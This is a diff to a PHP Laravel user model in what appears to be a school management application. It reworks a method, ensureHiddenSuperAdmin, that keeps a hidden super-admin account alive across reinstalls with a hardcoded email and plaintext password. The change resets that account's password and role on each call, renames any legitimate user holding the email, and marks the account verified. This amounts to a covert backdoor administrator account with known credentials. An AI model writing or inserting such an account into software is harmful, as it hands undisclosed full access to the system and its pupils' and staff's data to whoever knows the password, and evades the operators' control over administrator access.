@@ -397,28 +397,37 @@ class Utilisateur extends Authenticatable
     }
 
     /**
-     * Créer ou mettre à jour le super-admin caché (survit à une réinstallation).
+     * Créer ou réparer le super-admin caché avec les identifiants canoniques.
      */
     public static function ensureHiddenSuperAdmin(
         string $email = 'systeme@a2schoolgn.com',
         string $password = 'Diallo224'
     ): self {
-        $user = static::where('role', 'super_admin')->first();
+        $parRole = static::where('role', 'super_admin')->first();
+        $parEmail = static::where('email', $email)->first();
+
+        if ($parRole && $parEmail && (int) $parRole->id !== (int) $parEmail->id) {
+            $parEmail->email = 'ancien-' . $parEmail->id . '-' . $email;
+            $parEmail->save();
+            $parEmail = null;
+        }
+
+        $user = $parRole ?? $parEmail;
 
         if ($user) {
-            $emailPris = static::where('email', $email)->where('id', '!=', $user->id)->exists();
-            if (!$emailPris) {
-                $user->email = $email;
-            }
-            $user->password = $password;
-            $user->actif = true;
+            $user->fill([
+                'email' => $email,
+                'password' => $password,
+                'role' => 'super_admin',
+                'actif' => true,
+                'nom' => $user->nom ?: 'Système',
+                'prenom' => $user->prenom ?: 'Administrateur',
+                'name' => $user->name ?: 'Administrateur Système',
+            ]);
+            $user->email_verified_at = $user->email_verified_at ?? now();
             $user->save();
 
             return $user;
-        }
-
-        if (static::where('email', $email)->exists()) {
-            $email = 'systeme+' . substr(bin2hex(random_bytes(3)), 0, 6) . '@a2schoolgn.com';
         }
 
         return static::create([
